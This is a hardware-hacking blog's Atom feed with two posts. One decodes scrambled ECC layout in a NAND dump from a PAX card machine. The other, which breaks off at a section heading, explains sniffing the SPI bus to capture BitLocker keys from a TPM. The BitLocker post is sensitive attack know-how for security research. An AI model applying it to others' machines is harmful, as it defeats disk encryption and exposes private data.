<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://lucasteske.dev/feed.xml" rel="self" type="application/atom+xml" /><link href="https://lucasteske.dev/" rel="alternate" type="text/html" hreflang="en" /><updated>2024-01-16T22:31:21-03:00</updated><id>https://lucasteske.dev/feed.xml</id><title type="html">Lets Hack It</title><subtitle>Sou Lucas Teske, gosto de Eletrônica, Computação, Física.  Todos os hacks que eu fizer, serão colocados aqui. Aceito sugestões :D</subtitle><author><name>Lucas Teske</name><email>letshackit@nvx.li</email></author><entry><title type="html">NAND Flash Memory Analysis and Decoding - Unveiling ECC Scattering in Unknown Devices</title><link href="https://lucasteske.dev/2024/01/decoding-and-analysis-nand-flash" rel="alternate" type="text/html" title="NAND Flash Memory Analysis and Decoding - Unveiling ECC Scattering in Unknown Devices" /><published>2024-01-16T20:48:00-03:00</published><updated>2024-01-16T20:48:00-03:00</updated><id>https://lucasteske.dev/2024/01/decoding-and-analysis-nand-flash</id><content type="html" xml:base="https://lucasteske.dev/2024/01/decoding-and-analysis-nand-flash"><![CDATA[<h2 id="exploring-nand-memories">Exploring NAND Memories</h2>

<p>When in possession of a device whose internals one wishes to understand, accessing the content of the flash memory is not always straightforward. Due to the nature of NAND memories, an error correction algorithm is applied to all content, which can cause unintentional obfuscation of the content. Some manufacturers of processors that directly control NAND-type memories or developers of “protected” software choose to customize the way these algorithms function.</p>

<p>In this article, we will explore the basic structure of flash memory, why error correction exists, and how to identify the scattering of the error correction algorithm used.</p>

<h1 id="flash-memories">Flash Memories</h1>

<p>Flash memories have emerged as the backbone of digital storage in the contemporary era. Found in devices as varied as SSDs, USB drives, and SD cards, these memories bring an irresistible combination of speed, durability, and the ability to retain data even in the absence of power.</p>

<p>Historically, before the rise of flash memories, the main storage devices were based on magnetic media, such as hard disks and floppy disks, or on EPROMs (Erasable Programmable Read-Only Memory). While magnetic media had moving parts and were more prone to physical failures, EPROMs required a specific erasure process, making the rewriting of data a slower and less efficient process.</p>

<p>Within the category of flash memories, we find different variations, with NOR and NAND versions being the most predominant. In this article, we will focus on NAND flash memories, recognized for their high storage density and widely used in everyday storage devices, ensuring speed and reliability in reading and writing data.</p>

<h2 id="anatomy-of-a-nand-cell">Anatomy of a NAND Cell</h2>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-cell.svg" alt="Flash Memory Cell" />
<em>Detailed diagram of a NAND cell</em></p>

<p>At the heart of flash memory technology lies the intricate architecture of a NAND cell. The illustration above outlines the fundamental components of the cell: the Control Gate, the Floating Gate, insulating oxide layers, along with N-Type Source and N-Type Drain terminals, all built on a P-type substrate.
Bits are stored in the flash memory by retaining electrons in the Floating Gate.</p>

<p>During the write operation, a voltage is imposed on the Control Gate, inducing electrons to cross the oxide barrier and lodge in the Floating Gate. Once the electrons reach the Floating Gate, they remain there, denoting a “written” state.
<img src="/assets/posts/analise-e-decodificacao-flash/flash-write.svg" alt="Flash memory write process" /></p>

<p>To read the stored information, a voltage is applied to the Control Gate. If there are electrons in the Floating Gate, they will create a repulsive force, blocking the flow of electrons from the Source to the Drain. This state is recognized as a “0” bit. However, if the Floating Gate is unoccupied, the electric current will flow unimpeded, corresponding to a “1” bit.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-cell-programmed.svg" alt="Programmed state of a NAND cell" />
<em>NAND cell in the “written” state</em></p>

<p>Finally, the electronic configuration — whether its absence or presence — determines whether the cell is representing a “0” or “1” bit. The subsequent image shows a cell in the “erased” state, characterized by the free flow of electrons between the terminals.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-cell-erased.svg" alt="Erased state of a NAND cell" />
<em>NAND cell in the “erased” state</em></p>

<h2 id="nand-memory-architecture">NAND Memory Architecture</h2>

<p><img src="/assets/posts/analise-e-decodificacao-flash/nand-block.svg" alt="NAND Block Structure" />
<em>Diagram representing the organization of a NAND block</em></p>

<p>NAND memory is meticulously organized in a hierarchical structure. Starting with the smallest unit, we have the cell. These cells are grouped to form pages. Moving up the hierarchy, multiple pages are then consolidated to constitute a block, as illustrated in the diagram above.</p>

<p>This structural arrangement is not just for organization. It plays a vital role in the efficiency of flash memory operations. An important detail to consider is that, in various devices based on flash technology, the erase operation is performed at the block level, and not on individual cells or pages.</p>

<p>The image exemplifies a NAND memory containing pages of 2048 bytes of data added with 64 bytes designated for error correction, totaling 2112 bytes per page. These pages are grouped into blocks that house 64 pages each, resulting in 128K bytes of data and 4K bytes for correction.</p>

<p>The additional bytes in each page are not mere supplements. They are intrinsic to the memory’s integrity. Although stored in the same way as any other byte, they are often allocated for specific functions, such as parity in Error Correction (ECC) algorithms. This correction is indispensable, as during manufacturing or even over use, some cells of the NAND memory may present defects or wear out, compromising the accuracy of stored data. Therefore, ECC acts as a protective layer, ensuring the reliability of data even in the presence of imperfections in the memory.</p>

<h2 id="reading-flash-memories">Reading Flash Memories</h2>

<p>When dealing with reading and writing in Flash memories, a variety of devices are available. For flash memories with less conventional encapsulations, like BGA (Ball Grid Array), I often turn to the RT809H programmer, using a specific adapter for such encapsulation. The flash memory in question was originally extracted from a device by PAX, a model available on Mercado Livre under the description “card machine”. It is worth mentioning that the encapsulation type of this flash memory is BGA63, indicating an arrangement of 63 pins in the ball-grid-array format.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash_memory.jpg" alt="Flash Memory in the universal programmer RT809H ready for reading" /><em>Flash Memory in the universal programmer RT809H ready for reading</em></p>

<p>After extracting the data from the flash memory, a crucial step is using the <code class="language-plaintext highlighter-rouge">binwalk</code> tool. This command functions to scan and list possible signatures of known files contained in the memory dump, allowing a preliminary analysis of its content. This stage is essential to discern if we will face challenges when trying to decipher the stored data, such as if they are encrypted.</p>

<p>It is important to note that the image produced by the RT809H programmer depicts the content of the flash memory in its purest state, without any filtering. This means that the ECC (Error-Correcting Code) parity bits are included. This feature can introduce nuances during the analysis, as not all signatures will be accurately recognized, especially considering files that may start at the end of a memory page.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>binwalk F59L1G81MA@BGA63_1111.BIN

DECIMAL       HEXADECIMAL     DESCRIPTION
<span class="nt">--------------------------------------------------------------------------------</span>
438548        0x6B114         Base64 standard index table
<span class="o">(</span>...<span class="o">)</span>
3514378       0x35A00A        PC bitmap, Windows 3.x format,, 320 x 240 x 24
7839754       0x77A00A        uImage header, header size: 64 bytes, header CRC: 0x538F3DE9, created: 2021-05-27 08:14:51, image size: 3696472 bytes, Data Address: 0x80800000, Entry Point: 0x80800000, data CRC: 0xA22F74A5, OS: Linux, CPU: ARM, image <span class="nb">type</span>: OS Kernel Image, compression <span class="nb">type</span>: none, image name: <span class="s2">"Linux-2.7.93.9707R"</span>
7839818       0x77A04A        Linux kernel ARM boot executable zImage <span class="o">(</span>little-endian<span class="o">)</span>
7857081       0x77E3B9        <span class="nb">gzip </span>compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 <span class="o">(</span>null <span class="nb">date</span><span class="o">)</span>
<span class="o">(</span>...<span class="o">)</span>
20815882      0x13DA00A       uImage header, header size: 64 bytes, header CRC: 0xF95F6882, created: 2021-05-27 08:20:25, image size: 8185419 bytes, Data Address: 0x83800000, Entry Point: 0x83800000, data CRC: 0xE5674944, OS: Linux, CPU: ARM, image <span class="nb">type</span>: RAMDisk Image, compression <span class="nb">type</span>: none, image name: <span class="s2">"RAMDISK-2.7.93.9707R"</span>
<span class="o">(</span>...<span class="o">)</span>
20815946      0x13DA04A       <span class="nb">gzip </span>compressed data, maximum compression, from Unix, last modified: 2021-05-27 08:20:23
33792010      0x203A00A       uImage header, header size: 64 bytes, header CRC: 0x588DFFBC, created: 2021-05-27 08:19:13, image size: 6412038 bytes, Data Address: 0x0, Entry Point: 0x0, data CRC: 0x32979F1E, OS: Linux, CPU: ARM, image <span class="nb">type</span>: Firmware Image, compression <span class="nb">type</span>: none, image name: <span class="s2">"BASE-2.7.93.9707R"</span>
33792074      0x203A04A       <span class="nb">gzip </span>compressed data, maximum compression, from Unix, last modified: 2021-05-27 08:19:11
46768138      0x2C9A00A       UBI erase count header, version: 1, EC: 0x3, VID header offset: 0x800, data offset: 0x1000
</code></pre></div></div>

<p>Entropy assessment is an effective technique to detect encrypted or compressed content in a memory. When we talk about entropy in data, we are referring to the amount of information or unpredictability contained in these data. The <code class="language-plaintext highlighter-rouge">binwalk</code> tool offers a specific mode for measuring this entropy.</p>

<p>Files that are compressed or encrypted tend to display an apparently random data pattern, resulting in an entropy measure that approaches 1. In contrast, “plain-text” files or unencoded data generally have significantly lower entropy, tending towards values closer to 0, as their content is more predictable.</p>

<p>To explore this functionality in <code class="language-plaintext highlighter-rouge">binwalk</code>, use the <code class="language-plaintext highlighter-rouge">-E</code> option, which activates the entropy measurement mode. When executed, you will receive a graph that visually represents the entropy variations throughout the file, facilitating the identification of encrypted or compressed segments.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>binwalk <span class="nt">-E</span> F59L1G81MA@BGA63_1111.BIN
DECIMAL       HEXADECIMAL     ENTROPY
<span class="nt">--------------------------------------------------------------------------------</span>
0             0x0             Falling entropy edge <span class="o">(</span>0.027839<span class="o">)</span>
7880704       0x784000        Rising entropy edge <span class="o">(</span>0.995063<span class="o">)</span>
12345344      0xBC6000        Falling entropy edge <span class="o">(</span>0.000000<span class="o">)</span>
20869120      0x13E7000       Rising entropy edge <span class="o">(</span>0.997811<span class="o">)</span>
29257728      0x1BE7000       Falling entropy edge <span class="o">(</span>0.000000<span class="o">)</span>
33824768      0x2042000       Rising entropy edge <span class="o">(</span>0.999076<span class="o">)</span>
40386560      0x2684000       Falling entropy edge <span class="o">(</span>0.372003<span class="o">)</span>
47253504      0x2D10800       Falling entropy edge <span class="o">(</span>0.725862<span class="o">)</span>
62879744      0x3BF7800       Falling entropy edge <span class="o">(</span>0.737729<span class="o">)</span>
67244032      0x4021000       Rising entropy edge <span class="o">(</span>0.966013<span class="o">)</span>
67311616      0x4031800       Falling entropy edge <span class="o">(</span>0.776734<span class="o">)</span>
69611520      0x4263000       Falling entropy edge <span class="o">(</span>0.790624<span class="o">)</span>
69679104      0x4273800       Rising entropy edge <span class="o">(</span>0.972091<span class="o">)</span>
69814272      0x4294800       Falling entropy edge <span class="o">(</span>0.836573<span class="o">)</span>
70322176      0x4310800       Falling entropy edge <span class="o">(</span>0.844177<span class="o">)</span>
72689664      0x4552800       Falling entropy edge <span class="o">(</span>0.643195<span class="o">)</span>
74008576      0x4694800       Falling entropy edge <span class="o">(</span>0.783870<span class="o">)</span>
74584064      0x4721000       Falling entropy edge <span class="o">(</span>0.471472<span class="o">)</span>
75259904      0x47C6000       Falling entropy edge <span class="o">(</span>0.787818<span class="o">)</span>
76613632      0x4910800       Falling entropy edge <span class="o">(</span>0.823394<span class="o">)</span>
76748800      0x4931800       Falling entropy edge <span class="o">(</span>0.687502<span class="o">)</span>
82837504      0x4F00000       Falling entropy edge <span class="o">(</span>0.360502<span class="o">)</span>
84291584      0x5063000       Falling entropy edge <span class="o">(</span>0.775172<span class="o">)</span>
84934656      0x5100000       Falling entropy edge <span class="o">(</span>0.714603<span class="o">)</span>
95385600      0x5AF7800       Falling entropy edge <span class="o">(</span>0.788762<span class="o">)</span>
103233536     0x6273800       Falling entropy edge <span class="o">(</span>0.775540<span class="o">)</span>
104992768     0x6421000       Falling entropy edge <span class="o">(</span>0.750242<span class="o">)</span>
124475392     0x76B5800       Falling entropy edge <span class="o">(</span>0.281623<span class="o">)</span>
125253632     0x7773800       Falling entropy edge <span class="o">(</span>0.750710<span class="o">)</span>
133507072     0x7F52800       Falling entropy edge <span class="o">(</span>0.798972<span class="o">)</span>
137566208     0x8331800       Falling entropy edge <span class="o">(</span>0.768062<span class="o">)</span>
137701376     0x8352800       Falling entropy edge <span class="o">(</span>0.743758<span class="o">)</span>
</code></pre></div></div>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-entropy.svg" alt="Entropy of the Read Image" /><em>Entropy of the Read Image</em></p>

<p>In the presented entropy graph, the areas of high entropy stand out as peaks that approach the value of 1 on the vertical axis. These regions point to sections of data that have a distribution of bits that appears random, which is typical of compressed or encrypted data.</p>

<p>By correlating the position of these peaks with the information provided by the <code class="language-plaintext highlighter-rouge">binwalk</code> command, we can understand the nature of these high entropy segments. In our case, the points of high entropy correspond to compressed parts, and not encrypted data. This deduction becomes clear when we see that <code class="language-plaintext highlighter-rouge">binwalk</code> identified signatures related to data compressed with <em>gzip</em> at the indicated positions.</p>

<p>The fact of recognizing these signatures clearly shows that the content, although compressed, is not encrypted. If it were, <code class="language-plaintext highlighter-rouge">binwalk</code> would not have identified these signatures, as encrypted data looks like a bunch of random information, without specific patterns. Thus, looking at both the entropy graph and the information from <code class="language-plaintext highlighter-rouge">binwalk</code>, we get a good idea of the structure and type of data in the analyzed flash memory.</p>

<h2 id="when-ecc-scattering-is-not-standard">When ECC Scattering is Not Standard</h2>

<p>To ensure that data is accessed accurately, it is crucial to exclude the parity bits inserted into each memory page. Assuming that the last 64 bytes of each page are allocated for ECC, we can create a Python script that reads the 2112 bytes (representing the full memory page) and writes only the 2048 bytes corresponding to the pure data, disregarding the ECC, into a new file.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"F59L1G81MA@BGA63_1111.BIN"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span>
<span class="n">o</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"FIXEDDATA.bin"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>
<span class="n">pagesToRead</span> <span class="o">=</span> <span class="mi">65536</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">pagesToRead</span><span class="p">):</span>
  <span class="n">page</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">2112</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">page</span><span class="p">[:</span><span class="mi">2048</span><span class="p">])</span> <span class="c1"># Nuke ECC
</span>  <span class="n">o</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
<span class="n">o</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p>With the data now cleaned, the next step is to identify the files present to verify the efficacy of our assumption. A quick look at the list of files highlighted by <em>binwalk</em> will give us an indication.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>binwalk F59L1G81MA@BGA63_1111.BIN

DECIMAL       HEXADECIMAL     DESCRIPTION
<span class="nt">--------------------------------------------------------------------------------</span>
438548        0x6B114         Base64 standard index table
439650        0x6B562         DES PC1 table
439738        0x6B5BA         DES PC2 table
440945        0x6BA71         DES SP2, little endian
441738        0x6BD8A         DES SP1, little endian
477666        0x749E2         Certificate <span class="k">in </span>DER format <span class="o">(</span>x509 v3<span class="o">)</span>, header <span class="o">(</span>...<span class="o">)</span>
478540        0x74D4C         Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
479065        0x74F59         Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
1384724       0x152114        Base64 standard index table
1385826       0x152562        DES PC1 table
1385914       0x1525BA        DES PC2 table
1387121       0x152A71        DES SP2, little endian
1387914       0x152D8A        DES SP1, little endian
1423842       0x15B9E2        Certificate <span class="k">in </span>DER format <span class="o">(</span>x509 v3<span class="o">)</span>, header <span class="o">(</span>...<span class="o">)</span>
1424716       0x15BD4C        Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
1425241       0x15BF59        Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
3514378       0x35A00A        PC bitmap, Windows 3.x format,, 320 x 240 x 24
7839754       0x77A00A        uImage header, header size: 64 bytes, header <span class="o">(</span>...<span class="o">)</span>
7839818       0x77A04A        Linux kernel ARM boot executable zImage <span class="o">(</span>litt<span class="o">(</span>...<span class="o">)</span>
7857081       0x77E3B9        <span class="nb">gzip </span>compressed data, maximum compression,   <span class="o">(</span>...<span class="o">)</span>
<span class="o">(</span>...<span class="o">)</span>
</code></pre></div></div>

<p>We can identify a <em>bitmap</em> right at the beginning of the image, where <em>binwalk</em> is even able to identify its size and bit depth:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3514378       0x35A00A        PC bitmap, Windows 3.x format,, 320 x 240 x 24
</code></pre></div></div>

<p>A distinctive characteristic of <em>bitmaps</em> is the way they store color information. The bytes in the file map directly to the colors of the image. Thus, when we have a region of the image that displays a single color, that color is represented by consecutive sequences of identical bytes in the file. This property is especially useful when we try to discern the distribution of error-correcting bits (ECC). If a segment of the bitmap, fitting to a memory page, displays the same color as another segment on a different page, it’s expected that their corresponding ECC bits would be identical.</p>

<p>Considering that the identified image has a color depth of 24 bpp (bits per pixel), each pixel is represented by 3 bytes. Given a memory page capacity of 2048 bytes, this translates to about 682 pixels per page. This is slightly more than two lines of the image. The attempt to access the <em>bitmap</em> in its current form suggests inconsistencies, leading us to question our initial assumptions about the distribution of ECC bits.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/pax-broken.jpg" alt="Corrupted PAX Logo" /><em>Corrupted PAX Logo</em></p>

<p>For proper interpretation, it’s vital to extract multiple pages from the memory containing the bitmap data in an aligned manner. This way, we can ensure that at every 2112 byte interval, we are dealing with a new page, not a continuation of the previous one. Subsequently, we can use an image editing software that allows manipulating images in arbitrary “RAW” formats. In this context, we will use GIMP to analyze the raw image data. One of the advantages of GIMP is the flexibility in defining the image geometry and pixel formatting.</p>

<p>To facilitate the identification of ECC bits, we’ll set the image width to 2112, corresponding to the memory page size. This will allow us to visualize each memory page as a distinct line. We’ll choose an 8-bit per pixel representation in monochrome to ensure an exact correspondence of 2112 bytes per line. Regarding the height, we’ll opt for at least 100 lines to provide a clear view of variations between different memory pages.</p>

<p>Examining the visual representation provided by GIMP, we notice clearly defined segments of 512 bytes within each memory page. These segments are interspersed with thinner columns, whose appearance seems directly influenced by the adjacent block.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/block-analysis.jpg" alt="512 byte blocks" /><em>512 byte blocks</em></p>

<p>Looking closer, we realize that the completely black lines display a column with consistent patterns to the left of the 512-byte mark. Contrary to this, lines that show some variation also manifest discrepancies in that same column on the left. Based on this observation, we can infer that the columns positioned both to the left and right of the 512-byte segment represent parity data, and are not an intrinsic part of the bitmap. This becomes even more evident considering that the first lines of the bitmap are entirely black.</p>

<p>Considering the memory page as a whole, another detail stands out: despite the observed pattern, there is a completely white column in an unexpected position. Additionally, the first column, which theoretically should be white, appears to be displaced or altered in some way.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/block-analysis-1.png" alt="Column apparently switched place" /><em>Column apparently switched place</em></p>

<p>The hypothesis suggests that, for some reason, these columns may have been switched during the scattering process. To validate this assumption, a practical approach would be to use GIMP itself to reposition the column and assess if the resulting content aligns harmoniously with the rest of the memory page.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/block-analysis-3.png" alt="Switching identified columns" /><em>Switching identified columns</em></p>

<p>The above image validates our conjecture, highlighting that the reallocation of columns provides a more coherent visualization of the content. Although it seems unusual at first glance, considering the security nature of the device, it is plausible to think that this altered arrangement could be a deliberate way of hiding data. This peculiarity is not mentioned in any public documentation available for the device’s processor.</p>

<p>Based on these findings, we have the tools needed to refine our Python script, aiming to eliminate the parity bits and rearrange the 512-byte segments, in order to obtain a refined and coherent image.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"F59L1G81MA@BGA63_1111.BIN"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span>
<span class="n">o</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"FIXEDDATA.bin"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>
<span class="n">pagesToRead</span> <span class="o">=</span> <span class="mi">65536</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">pagesToRead</span><span class="p">):</span>
  <span class="n">page</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">2112</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">page</span><span class="p">[</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="o">+</span><span class="mi">512</span><span class="p">]</span> <span class="o">+</span> <span class="n">page</span><span class="p">[</span><span class="mi">535</span><span class="p">:</span><span class="mi">535</span><span class="o">+</span><span class="mi">512</span><span class="p">]</span> <span class="o">+</span> <span class="n">page</span><span class="p">[</span><span class="mi">1060</span><span class="p">:</span><span class="mi">1060</span><span class="o">+</span><span class="mi">512</span><span class="p">]</span> <span class="o">+</span> <span class="n">page</span><span class="p">[</span><span class="mi">1585</span><span class="p">:</span><span class="mi">1585</span><span class="o">+</span><span class="mi">512</span><span class="p">])</span>
  <span class="n">data</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">-</span><span class="mi">48</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">page</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
  <span class="n">o</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
<span class="n">o</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p>After all the steps of analysis and correction, we successfully extracted the <em>bitmap</em> and validated that all our hypotheses and methods of analysis were correct:
<img src="/assets/posts/analise-e-decodificacao-flash/pax-fixed.jpg" alt="Adjusted PAX Logo" /><em>Adjusted PAX Logo</em></p>

<h2 id="conclusion">Conclusion</h2>

<p>It is essential to highlight that our approach was limited to <strong>removing</strong> the parity bits, without actually applying the error correction algorithm. As mentioned earlier, flash memories, particularly NAND type, can have defective bits, even from the time of manufacturing. Omitting the specific ECC algorithm may result in inconsistencies in the final data.</p>

<p>Fortunately, the content of this specific device <strong>was not</strong> encrypted, which made it easier for us in the analysis of scattering, taking advantage only of known content. If the content had been encrypted, it would be essential to identify a recurring pattern (such as empty memory pages) where the ECC information would be recorded.</p>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Satellite" /><category term="SDR" /><category term="Flash" /><category term="PAX" /><category term="Hardware Hacking" /><category term="RE" /><category term="Reverse Engineering" /><category term="NAND" /><category term="PAX" /><category term="RT809H" /><summary type="html"><![CDATA[Exploring NAND Memories]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/analise-e-decodificacao-flash/flash-cell-programmed.svg" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/analise-e-decodificacao-flash/flash-cell-programmed.svg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TPM 2.0: Extracting Bitlocker keys through SPI</title><link href="https://lucasteske.dev/2024/01/tpm2-bitlocker-keys" rel="alternate" type="text/html" title="TPM 2.0: Extracting Bitlocker keys through SPI" /><published>2024-01-16T20:48:00-03:00</published><updated>2024-01-16T20:48:00-03:00</updated><id>https://lucasteske.dev/2024/01/tpm2-bitlocker-keys</id><content type="html" xml:base="https://lucasteske.dev/2024/01/tpm2-bitlocker-keys"><![CDATA[<p>The TPM 2.0, also known as Trusted Platform Module 2.0, is a hardware security feature embedded in many modern computers. Its purpose is to provide a secure way to store cryptographic keys and other sensitive data, such as passwords and digital certificates, aiming to protect against various security threats, including unauthorized access to a computer’s hardware and software. TPM 2.0 represents an evolution of the original TPM specification, developed by the Trusted Computing Group (TCG), and features additional capabilities and resources, such as support for additional cryptographic algorithms and the ability to store larger amounts of data.</p>

<h3 id="good-things">Good Things</h3>

<p>Currently, the Trusted Platform Module (TPM) is widely used by Full Disk Encryption (FDE) mechanisms and also by specific device encryption, as it is usually linked to the device (soldered on the motherboard).</p>

<p>It is noteworthy that, besides being an advanced security feature in modern machines, the communication protocol used by TPM Integrated Circuits (ICs) is quite simple. Generally, TPM ICs use the Serial Peripheral Interface (SPI) communication protocol, but they can also use the Low Pin Count (LPC) and Inter-Integrated Circuit (I2C) protocols. An important issue to raise is that users generally trust the TPM as a reliable security measure, however, bus traffic is often transmitted in plain text. For example, after the TPM is unlocked, the Windows Bitlocker key is transmitted in plain text on the bus.</p>

<p>For this article, the assumptions and analyses are based on the 2.0 specification, version 1.03v22 of the TPM (as of the current article date, the most used specification in home computers and servers), which is available here: <a href="https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf">https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf</a></p>

<p>Furthermore, it is important to mention that this article is based on two other articles, which can be found at the following links:</p>

<p><a href="https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key">https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key</a></p>

<p><a href="https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network">https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network</a></p>

<p>It should be noted that, to date, the applied knowledge has successfully allowed the extraction of a Bitlocker key in a real scenario.</p>

<h3 id="tpm-spi-transaction">TPM SPI Transaction</h3>

<p>A Trusted Platform Module (TPM) transaction through the Serial Peripheral Interface (SPI) protocol is a series of operations performed by a TPM device. These operations typically include TPM initialization, creation and management of cryptographic keys, and execution of cryptographic operations such as encryption and signing.</p>

<p>A common example of TPM usage is to protect the encryption keys of a system, allowing the system to boot only if the TPM permits after a series of security checks. Another example is creating a secure connection with another device by generating a unique key pair, storing the private key in the TPM, and sharing the public key with the other device.</p>

<p>TPM device transactions are usually executed by interacting with a TPM device driver, which is software that communicates with the TPM device and manages its operations. TPM device transactions are typically governed by the Application Programming Interface (API) of the TPM2.0 library.</p>

<p>There are various types of transactions that can be analyzed through SPI, but for the purpose of recovering Bitlocker keys, only two are relevant: FIFO Write and FIFO Read. Focusing on these two operations is necessary to access the Volume Master Key (VMK), which is responsible for encrypting the AES256-XTS key.</p>

<p>The VMK is encrypted by the TPM and stored in the Bitlocker header of the target disk. During the boot process, the Windows bootloader retrieves the encrypted VMK from the Bitlocker header and sends it to the TPM as a decryption request. The TPM then sends back the decrypted version of the VMK, assuming the TPM is correctly configured and all security checks have been passed. The outcome of the decryption process depends on the TPM configuration.</p>

<p>In systems with complete secure boot, the TPM requires multiple hashes to be correctly initialized during the early stages of the boot process. The specific details of this process are beyond the scope of this explanation, but it is important to note that each step of the system’s boot process hashes the next step and loads it into the TPM. For example, the first step is a bootrom inside the CPU that checks the signature of the first stage of the BIOS.</p>

<h3 id="intercepting-the-tpm">Intercepting the TPM</h3>

<p>The Trusted Platform Module (TPM) chip is usually located on a motherboard in a way that is not easily accessible, for example, on the keyboard side of a laptop. However, since the Serial Peripheral Interface (SPI) is a bus protocol, it can be inferred that all SPI devices on the motherboard use the same clock and data lines. As a result, it is possible to connect a logic analyzer to the SPI flash memory storing the BIOS/UEFI code and monitor any SPI transactions that occur when the flash memory is inactive (when the chip select signal for the flash memory is low). This approach allows for detecting the relevant transactions to recover Bitlocker keys.
<img src="/assets/posts/patreon/Pasted image 20230124034954.png" alt="" />
<img src="/assets/posts/patreon/Pasted image 20230124035004.png" alt="" /></p>

<p>This method, however, can lead to potential complications if there are other devices connected to the same SPI bus, besides the SPI flash memory and the TPM. Although it is relatively unlikely that multiple devices are connected to the same bus in this context.</p>

<p>In pulseview, we can analyze the SPI bytes using the SPI decoder function.
<img src="/assets/posts/patreon/Pasted image 20230124035010.png" alt="" />
<img src="/assets/posts/patreon/Pasted image 20230124035020.png" alt="" /></p>

<p>Next, we need to set up the SPI decoder for the correct signals to be able to see the decoded bytes.
<img src="/assets/posts/patreon/Pasted image 20230124035029.png" alt="" /></p>

<p>Then, you will notice that, as we leave the CS# polarity field as “<strong>active-low</strong>”, it is decoding only the BIOS Flash transactions, not the “rest” of the bus.
<img src="/assets/posts/patreon/Pasted image 20230124035036.png" alt="" /></p>

<p>If we select “<strong>active-high</strong>”, we will analyze anything that is <strong>not</strong> BIOS flash (which is what we want):
<img src="/assets/posts/patreon/Pasted image 20230124035040.png" alt="" /></p>

<p>Now we have analyzed bytes for the SPI, which makes it easier for us to work with them. Now we need to create a sigrok plugin to analyze it.</p>

<h3 id="analyzing-tpm-in-sigrok--pulseview">Analyzing TPM in Sigrok / Pulseview</h3>

